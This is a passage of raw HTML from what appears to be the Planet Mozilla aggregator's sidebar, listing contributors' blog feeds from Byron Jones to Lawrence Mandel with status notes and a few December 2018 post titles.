src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.glob.com.au/feed/" class="message" title="no activity in 90 days">Byron Jones</a></li><li><a title="subscribe" href="http://tenfourfox.blogspot.com/feeds/posts/default?alt=rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://tenfourfox.blogspot.com/" title="TenFourFox Development" class="active">Cameron Kaiser</a><ul><li><a href="http://tenfourfox.blogspot.com/2018/12/a-thank-you-to-ginn-chen-whom-larry.html">A thank you to Ginn Chen, whom Larry Ellison screwed</a></li><li><a href="http://tenfourfox.blogspot.com/2018/12/tenfourfox-fpr11-available.html">TenFourFox FPR11 available</a></li><li><a href="http://tenfourfox.blogspot.com/2018/12/edge-gets-chrome-plated-and-were-all.html">Edge gets Chrome-plated, and we're all worse off</a></li><li><a href="http://tenfourfox.blogspot.com/2018/11/something-for-weekend-classic-macos-lua.html">Something for the weekend: Classic MacOS Lua</a></li></ul></li><li><a title="subscribe" href="https://mcc.id.au/feed-planet-mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mcc.id.au/" class="message" title="no activity in 90 days">Cameron McCormack</a></li><li><a title="subscribe" href="https://blog.mozilla.org/tomcat/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/tomcat" class="message" title="no activity in 90 days">Carsten Book</a></li><li><a title="subscribe" href="https://chelseanovak.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://chelseanovak.wordpress.com/" class="message" title="no activity in 90 days">Chelsea Novak</a></li><li><a title="subscribe" href="https://atlee.ca/blog/categories/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://atlee.ca/" title="chris' random ramblings (Posts about Mozilla)">Chris AtLee</a></li><li><a title="subscribe" href="http://coopcoopbware.tumblr.com/tagged/Mozilla/rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://coopcoopbware.tumblr.com/" class="message" title="no activity in 90 days">Chris Cooper</a></li><li><a title="subscribe" href="https://chuttenblog.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://chuttenblog.wordpress.com/" title="mozilla ‚Äì chuttenblog" class="active">Chris H-C</a><ul><li><a href="https://chuttenblog.wordpress.com/2018/12/18/data-science-is-festive-christmas-light-reliability-by-colour/">Data Science is Festive: Christmas Light Reliability by Colour</a></li></ul></li><li><a title="subscribe" href="http://feeds.feedburner.com/MozillaChrisIlias"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://ilias.ca/blog" title="Mozilla ‚Äì Chris Ilias">Chris Ilias</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Chris Manchester</a></li><li><a title="subscribe" href="https://www.blogger.com/feeds/5537325711190185140/posts/default/-/mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.pearce.org.nz/search/label/mozilla" title="Thundering Herd">Chris Pearce</a></li><li><a title="subscribe" href="https://cpeterso.com/blog/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://cpeterso.com/blog" class="message" title="no activity in 90 days">Chris Peterson</a></li><li><a title="subscribe" href="https://christian.legnitto.com/blog/categories/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://christian.legnitto.com/blog" title="Mozilla ‚Äì LegNeato!">Christian Legnitto</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="http status 503">Christian Sejersen</a></li><li><a title="subscribe" href="http://ncubeeight.blogspot.com/feeds/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ncubeeight.blogspot.com/" class="message" title="no activity in 90 days">Christopher Arnold</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="http status 503">Dan Mills</a></li><li><a title="subscribe" href="http://glazman.org/weblog/dotclear/?feed/planetmoz"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.glazman.org/weblog/dotclear/index.php" class="message" title="no activity in 90 days">Daniel Glazman</a></li><li><a title="subscribe" href="http://blog.dholbert.org/feeds/posts/default/-/mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.dholbert.org/search/label/mozilla" class="message" title="no activity in 90 days">Daniel Holbert</a></li><li><a title="subscribe" href="https://danielpocock.com/tags/mozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://danielpocock.com/tags/mozilla" title="DanielPocock.com - mozilla" class="active">Daniel Pocock</a><ul><li><a href="https://danielpocock.com/merry-christmas-balkans-2018">Merry Christmas from the Balkans</a></li><li><a href="https://danielpocock.com/smart-home-where-to-start">Smart home: where to start?</a></li><li><a href="https://danielpocock.com/connecting-free-software-and-human-rights">Connecting software freedom and human rights</a></li></ul></li><li><a title="subscribe" href="https://daniel.haxx.se/blog/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://daniel.haxx.se/blog" title="daniel.haxx.se" class="active">Daniel Stenberg</a><ul><li><a href="https://daniel.haxx.se/blog/2018/12/23/a-curl-2018-retrospective/">A curl 2018 retrospective</a></li><li><a href="https://daniel.haxx.se/blog/2018/12/21/http-3-talk-in-stockholm-on-january-22/">HTTP/3 talk in Stockholm on January 22</a></li><li><a href="https://daniel.haxx.se/blog/2018/12/19/why-is-curl-different-everywhere/">Why is curl different everywhere?</a></li><li><a href="https://daniel.haxx.se/blog/2018/12/12/7-63-0-the-endless-path/">7.63.0 ‚Äì another step down the endless path</a></li></ul></li><li><a title="subscribe" href="https://davehunt.co.uk/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://davehunt.co.uk/" class="message" title="no activity in 90 days">Dave Hunt</a></li><li><a title="subscribe" href="http://blog.linuxprogrammer.org/rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.linuxprogrammer.org/" class="message" title="no activity in 90 days">Dave Huseby</a></li><li><a title="subscribe" href="http://www.oxymoronical.com/blog/category/technical/feed/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.oxymoronical.com/" class="message" title="no activity in 90 days">Dave Townsend</a></li><li><a title="subscribe" href="https://medium.com/feed/@david_bryant"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/@david_bryant?source=rss-b6142bb477cd------2" class="message" title="no activity in 90 days">David Bryant</a></li><li><a title="subscribe" href="http://www.theautomatedtester.co.uk/feed.rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.theautomatedtester.co.uk/" class="message" title="no activity in 90 days">David Burns</a></li><li><a title="subscribe" href="https://campd.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://campd.wordpress.com/" class="message" title="no activity in 90 days">David Camp</a></li><li><a title="subscribe" href="https://blog.humphd.org/tag/mozilla/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.humphd.org/" title="mozilla - Bread &amp; Circuits" class="active">David Humphrey</a><ul><li><a href="https://blog.humphd.org/processing-js-2008/">Processing.js 2008-2018</a></li></ul></li><li><a title="subscribe" href="https://dlawrence.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://dlawrence.wordpress.com/" title="Dave's Ramblings">David Lawrence</a></li><li><a title="subscribe" href="https://yoric.github.io/categories/mozilla/index.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://yoric.github.io/categories/mozilla/" class="message" title="no activity in 90 days">David Teller</a></li><li><a title="subscribe" href="https://djst.org/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://djst.org/" class="message" title="no activity in 90 days">David Tenser</a></li><li><a title="subscribe" href="https://satdavmozilla.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://satdavmozilla.wordpress.com/" class="message" title="no activity in 90 days">David Weir (satdav)</a></li><li><a title="subscribe" href="http://schub.io/blog/feeds/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://schub.io/" title="Dennis Schubert - Blog - Mozilla">Dennis Schubert</a></li><li><a title="subscribe" href="https://autonome.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://autonome.wordpress.com/" class="message" title="no activity in 90 days">Dietrich Ayala</a></li><li><a title="subscribe" href="https://blog.zgp.org/feed/mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.zgp.org/" title="Don Marti" class="active">Don Marti</a><ul><li><a href="https://blog.zgp.org/firefox-extensions-list-2018/">Firefox extensions list 2018</a></li></ul></li><li><a title="subscribe" href="http://literaci.es/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://literaci.es/" class="message" title="no activity in 90 days">Doug Belshaw</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="http status 503">Doug Warner</a></li><li><a title="subscribe" href="http://code.v.igoro.us/feed.mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://code.v.igoro.us/" title="Code Vigorous - Mozilla">Dustin J. Mitchell</a></li><li><a title="subscribe" href="http://kvark.github.io/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://kvark.github.io/" class="message" title="no activity in 90 days">Dzmitry Malyshau</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">D√£o Gottwald</a></li><li><a title="subscribe" href="https://ed.agadak.net/feed?cat=5"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ed.agadak.net/" class="message" title="no activity in 90 days">Edward Lee</a></li><li><a title="subscribe" href="https://ehsanakhgari.org/tag/planet/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ehsanakhgari.org/" class="message" title="no activity in 90 days">Ehsan Akhgari</a></li><li><a title="subscribe" href="https://blog.monotonous.org/feed/atom/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.monotonous.org/" class="message" title="no activity in 90 days">Eitan Isaacson</a></li><li><a title="subscribe" href="http://edunham.net/rss.html?tag=planetmozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://edunham.net/" class="message" title="no activity in 90 days">Emily Dunham</a></li><li><a title="subscribe" href="https://emceeaich.dreamwidth.org/data/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://emceeaich.dreamwidth.org/" class="message" title="no activity in 90 days">Emma Humphries</a></li><li><a title="subscribe" href="http://tiptoes.ca/category/remo/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://tiptoes.ca/" class="message" title="no activity in 90 days">Emma Irwin</a></li><li><a title="subscribe" href="http://www.erahm.org/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.erahm.org/" class="message" title="no activity in 90 days">Eric Rahm</a></li><li><a title="subscribe" href="http://www.bitstampede.com/?feed=rss2&amp;cat=4"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.bitstampede.com/" class="message" title="no activity in 90 days">Eric Shepherd</a></li><li><a title="subscribe" href="https://ejsf22.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://ejsf22.wordpress.com/" class="message" title="no activity in 90 days">Erica Jostedt</a></li><li><a title="subscribe" href="https://felipe.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://felipe.wordpress.com/" class="message" title="no activity in 90 days">Felipe Gomes</a></li><li><a title="subscribe" href="https://mozilla.github.io/firefox-browser-architecture/newsletters.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://mozilla.github.io/firefox-browser-architecture" class="message" title="no activity in 90 days">Firefox Browser Architecture</a></li><li><a title="subscribe" href="https://blog.nightly.mozilla.org/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.nightly.mozilla.org/" title="Firefox Nightly News">Firefox Nightly</a></li><li><a title="subscribe" href="https://blog.mozilla.org/fxtesteng/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/fxtesteng/feed/" class="message" title="no activity in 90 days">Firefox Test Engineering</a></li><li><a title="subscribe" href="https://medium.com/feed/firefox-test-pilot"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/firefox-test-pilot?source=rss----46b1a2ddb811---4" title="Firefox Test Pilot - Medium">Firefox Test Pilot</a></li><li><a title="subscribe" href="https://medium.com/feed/firefox-ux"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/firefox-ux?source=rss----da1138ddf2cd---4" title="Firefox User Experience - Medium">Firefox UX</a></li><li><a title="subscribe" href="http://blog.queze.net/feed/category/Mozilla/rss2"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.queze.net/" class="message" title="no activity in 90 days">Florian Qu√®ze</a></li><li><a title="subscribe" href="http://florianscholz.com/planet-mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://florianscholz.com/" class="message" title="no activity in 90 days">Florian Scholz</a></li><li><a title="subscribe" href="https://www.yetanothertechblog.com/category/planet/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.yetanothertechblog.com/" class="message" title="no activity in 90 days">Francesco Lodolo</a></li><li><a title="subscribe" href="http://feeding.cloud.geek.nz/tags/mozilla/index.rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://feeding.cloud.geek.nz/tags/mozilla/" title="pages tagged mozilla">Fran√ßois Marier</a></li><li><a title="subscribe" href="http://frederic-wang.fr/feeds/atom-mozilla.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://frederic-wang.fr/" class="message" title="no activity in 90 days">Fr√©d√©ric Wang</a></li><li><a title="subscribe" href="https://gabisurita.github.io/feeds/all.rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://gabisurita.github.io/feeds/gabisurita.github.io/" class="message" title="no activity in 90 days">Gabriela Surita</a></li><li><a title="subscribe" href="https://medium.com/feed/@garethaye"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/@garethaye?source=rss-3e425d04c8c------2" class="message" title="no activity in 90 days">Gareth Aye</a></li><li><a title="subscribe" href="https://garykwong.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://garykwong.wordpress.com/" class="message" title="no activity in 90 days">Gary Kwong</a></li><li><a title="subscribe" href="http://www.darktrojan.net/news/tag/mozilla?atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.darktrojan.net/news/tag/mozilla" class="message" title="no activity in 90 days">Geoff Lankow</a></li><li><a title="subscribe" href="https://medium.com/feed/georg-fritzsche"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://medium.com/georg-fritzsche?source=rss----9eb1bc803268---4" class="message" title="no activity in 90 days">Georg Fritzsche</a></li><li><a title="subscribe" href="https://georgeroter.org/category/participation/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://georgeroter.org/" class="message" title="no activity in 90 days">George Roter</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/HackingForChrist"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.gerv.net/" class="message" title="no activity in 90 days">Gervase Markham</a></li><li><a title="subscribe" href="http://www.blogger.com/feeds/5232577621384962517/posts/default/-/Mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.morbo.org/search/label/Mozilla" class="message" title="no activity in 90 days">Gian-Carlo Pascutto</a></li><li><a title="subscribe" href="https://www.gijsk.com/blog/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.gijsk.com/blog" title="Mozilla ‚Äì Use Tables!">Gijs Kruitbosch</a></li><li><a title="subscribe" href="http://hackademix.net/category/mozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://hackademix.net/" class="message" title="no activity in 90 days">Giorgio Maone</a></li><li><a title="subscribe" href="https://giorgos.sealabs.net/feeds/mozilla-planet.rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://giorgos.sealabs.net/" class="message" title="no activity in 90 days">Giorgos Logiotatidis</a></li><li><a title="subscribe" href="http://gregoryszorc.com/blog/feed/atom/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://gregoryszorc.com/blog" title="Gregory Szorc's Digital Home">Gregory Szorc</a></li><li><a title="subscribe" href="https://www.insecure.ws/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="no activity in 90 days">Guillaume Destuynder</a></li><li><a title="subscribe" href="https://hacks.mozilla.org/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://hacks.mozilla.org/" title="Mozilla Hacks ‚Äì the Web developer blog" class="active">Hacks.Mozilla.Org</a><ul><li><a href="https://hacks.mozilla.org/2018/12/mdn-changelog-for-november-2018/">MDN Changelog for November 2018</a></li><li><a href="https://hacks.mozilla.org/2018/12/firefox-64-released/">Firefox 64 Released</a></li><li><a href="https://hacks.mozilla.org/2018/12/rust-2018-is-here/">Rust 2018 is here‚Ä¶ but what is it?</a></li></ul></li><li><a title="subscribe" href="http://dtor.com/halfire/rss/categories/mozilla.html"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://dtor.com/halfire/" class="message" title="no activity in 90 days">Hal Wine</a></li><li><a title="subscribe" href="http://h4writer.com/?cat=2&amp;feed=rss2"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://h4writer.com/" class="message" title="no activity in 90 days">Hannes Verschore</a></li><li><a title="subscribe" href="https://hsivonen.fi/feed/mozilla/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://hsivonen.fi/" title="Henri Sivonen‚Äôs pages (Mozilla-only edition)" class="active">Henri Sivonen</a><ul><li><a href="https://hsivonen.fi/rust2019/">Rust 2019</a></li><li><a href="https://hsivonen.fi/encoding_rs/">encoding_rs: a Web-Compatible Character Encoding Library in Rust</a></li><li><a href="https://hsivonen.fi/cargo-fuzz/">Using cargo-fuzz to Transfer Code Review of Simple Safe Code to Complex Code that Uses unsafe</a></li><li><a href="https://hsivonen.fi/modern-cpp-in-rust/">How I Wrote a Modern C++ Library in Rust</a></li></ul></li><li><a title="subscribe" href="https://wiltw.io/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://wiltw.io/" class="message" title="no activity in 90 days">Henrik Mitsch</a></li><li><a title="subscribe" href="https://www.hskupin.info/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.hskupin.info/" class="message" title="no activity in 90 days">Henrik Skupin</a></li><li><a title="subscribe" href="https://www.janbambas.cz/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.janbambas.cz/" class="message" title="no activity in 90 days">Honza Bambas</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">IRL (podcast)</a></li><li><a title="subscribe" href="http://blog.ianbicking.org/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.ianbicking.org/" title="Ian Bicking: a blog">Ian Bicking</a></li><li><a title="subscribe" href="https://convolv.es/blog/categories/mozilla/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://convolv.es/" class="message" title="no activity in 90 days">J. Ryan Stinnett</a></li><li><a title="subscribe" href="https://tacticalsecret.com/tag/mozilla/rss/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://tacticalsecret.com/" class="message" title="no activity in 90 days">J.C. Jones</a></li><li><a title="subscribe" href="https://metajack.im/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://metajack.im/" class="message" title="no activity in 90 days">Jack Moffitt</a></li><li><a title="subscribe" href="http://www.jhugman.com/tag/mozilla?_t=rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.jhugman.com/tag/mozilla" class="message" title="no activity in 90 days">James Hugman</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/SoftwareIsHardPlanetMozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.softwareishard.com/blog" class="message" title="no activity in 90 days">Jan Odvarko</a></li><li><a title="subscribe" href="http://www.jandemooij.nl/blog/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://jandemooij.nl/" class="message" title="no activity in 90 days">Jan de Mooij</a></li><li><a title="subscribe" href="http://blog.janefinette.com/tagged/mozilla/rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.janefinette.com/" class="message" title="no activity in 90 days">Jane Finette</a></li><li><a title="subscribe" href="http://6a68.net/feed.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://6a68.net/" class="message" title="no activity in 90 days">Jared Hirsch</a></li><li><a title="subscribe" href="https://msujaws.wordpress.com/tag/planet-mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://msujaws.wordpress.com/" class="message" title="no activity in 90 days">Jared Wein</a></li><li><a title="subscribe" href="https://blog.mozilla.org/javascript/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/javascript" class="message" title="no activity in 90 days">JavaScript at Mozilla</a></li><li><a title="subscribe" href="http://jmvalin.dreamwidth.org/tag/mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://jmvalin.dreamwidth.org/data/rss?tag=mozilla" class="message" title="no activity in 90 days">Jean-Marc Valin</a></li><li><a title="subscribe" href="http://www.blogger.com/feeds/1386948037384435441/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://muizelaar.blogspot.com/" class="message" title="no activity in 90 days">Jeff Muizelaar</a></li><li><a title="subscribe" href="http://whereswalden.com/feed/atom/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://whereswalden.com/" class="message" title="no activity in 90 days">Jeff Walden</a></li><li><a title="subscribe" href="https://wrongbutuseful.com/tag/mozilla-planet/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://wrongbutuseful.com/" title="Mozilla Planet ‚Äì Wrong, but useful">Jesse McCrosky</a></li><li><a title="subscribe" href="https://jessilyndavis.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://jessilyndavis.wordpress.com/" class="message" title="no activity in 90 days">Jessilyn Davis</a></li><li><a title="subscribe" href="http://junglecode.net/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://junglecode.net/" class="message" title="no activity in 90 days">Jet Villegas</a></li><li><a title="subscribe" href="https://itcouldbesomuchbetter.wordpress.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://itcouldbesomuchbetter.wordpress.com/" class="message" title="no activity in 90 days">Jim Blandy</a></li><li><a title="subscribe" href="http://feeds.feedburner.com/jnchen/mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.jnchen.com/" class="message" title="no activity in 90 days">Jim Chen</a></li><li><a title="subscribe" href="http://incompleteness.me/mozblog/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://incompleteness.me/blog" class="message" title="no activity in 90 days">Joe Walker</a></li><li><a title="subscribe" href="http://elvis314.wordpress.com/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://elvis314.wordpress.com/" class="message" title="no activity in 90 days">Joel Maher</a></li><li><a title="subscribe" href="http://blog.johnford.org/feeds/posts/default/-/mozilla?alt=rss"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://blog.johnford.org/search/label/mozilla" class="message" title="no activity in 90 days">John Ford</a></li><li><a title="subscribe" href="http://www.intothefuzz.com/category/planetmozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.intothefuzz.com/" class="message" title="no activity in 90 days">John Slater</a></li><li><a title="subscribe" href="https://jonasfj.dk/category/computer/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://jonasfj.dk/" class="message" title="no activity in 90 days">Jonas Finnemann Jensen</a></li><li><a title="subscribe" href="https://jwatt.org/rss.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://jwatt.org/" class="message" title="no activity in 90 days">Jonathan Watt</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="no activity in 90 days">Jordan Lund</a></li><li><a title="subscribe" href="https://www.joshmatthews.net/blog/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.joshmatthews.net/blog" class="message" title="no activity in 90 days">Josh Matthews</a></li><li><a title="subscribe" href="http://quetzalcoatal.blogspot.com/feeds/posts/default"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://quetzalcoatal.blogspot.com/" class="message" title="no activity in 90 days">Joshua Cranmer</a></li><li><a title="subscribe" href="http://www.juliavallera.com/blog/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.juliavallera.com/blog" class="message" title="no activity in 90 days">Julia Vallera</a></li><li><a title="subscribe" href="https://blog.mozilla.org/jseward/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.mozilla.org/jseward" class="message" title="no activity in 90 days">Julian Seward</a></li><li><a title="subscribe" href="https://parkouss.wordpress.com/feed/?tag=Mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://parkouss.wordpress.com/" class="message" title="no activity in 90 days">Julien Pag√®s</a></li><li><a title="subscribe" href="http://jve.linuxwall.info/blog/index.php?feed/atom"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://j.vehent.org/blog/index.php?" class="message" title="no activity in 90 days">Julien Vehent</a></li><li><a title="subscribe" href="https://hoosteeno.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://hoosteeno.com/" class="message" title="no activity in 90 days">Justin Crawford</a></li><li><a title="subscribe" href="https://dolske.wordpress.com/category/planetmozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://dolske.wordpress.com/" class="message" title="no activity in 90 days">Justin Dolske</a></li><li><a title="subscribe" href="https://blog.callek.net/archives/category/mozilla/feed"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://blog.callek.net/" class="message" title="no activity in 90 days">Justin Wood</a></li><li><a title="subscribe" href="http://www.blogger.com/feeds/12340845/posts/default/-/Mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.twobraids.com/search/label/Mozilla" class="active message" title="no activity in 90 days">K Lars Lohn</a><ul><li><a href="http://www.twobraids.com/2018/04/things-gateway-virtual-weather-station.html">Things Gateway - a Virtual Weather Station</a></li></ul></li><li><a title="subscribe" href="http://vijayan.ca/blog/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://vijayan.ca/blog" class="message" title="no activity in 90 days">Kannan Vijayan</a></li><li><a title="subscribe" href="http://www.otsukare.info/feeds/atom.xml"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://www.otsukare.info/" title="otsukare">Karl Dubost</a></li><li><a title="subscribe" href="https://staktrace.com/spout/getrss.php?posts&amp;tag=mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://staktrace.com/spout" title="staktrace.com Blog">Kartikaya Gupta</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="404: not found">Kaustav Das Modak</a></li><li><a title="subscribe" href="http://mesquilla.com/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://mesquilla.com/" class="message" title="404: not found">Kent James</a></li><li><a title="subscribe" href="https://kev.needham.ca/?feed=rss2&amp;cat=37"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://kev.needham.ca/" class="message" title="internal server error">Kev Needham</a></li><li><a title="subscribe" href="http://www.kevinbrosnan.net/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://www.kevinbrosnan.net/" class="message" title="no activity in 90 days">Kevin Brosnan</a></li><li><a title="subscribe" href="https://kimmoir.blog/category/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://kimmoir.blog/" class="message" title="no activity in 90 days">Kim Moir</a></li><li><a title="subscribe" href="http://dbaron.org/log/rss1"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="https://dbaron.org/log/" class="message" title="no activity in 90 days">L. David Baron</a></li><li><a title="subscribe" href="http://contentsmayvary.blogspot.com/search/label/%23mozilla"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a href="http://contentsmayvary.blogspot.com/feeds/posts/default" class="message" title="no activity in 90 days">Larissa Shapiro</a></li><li><a title="subscribe"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a class="message" title="http status 503">Laura Thomson</a></li><li><a title="subscribe" href="https://lawrencemandel.com/tag/mozilla/feed/"><img src="feed-icon-10x10.png" alt="(feed)" /></a> <a 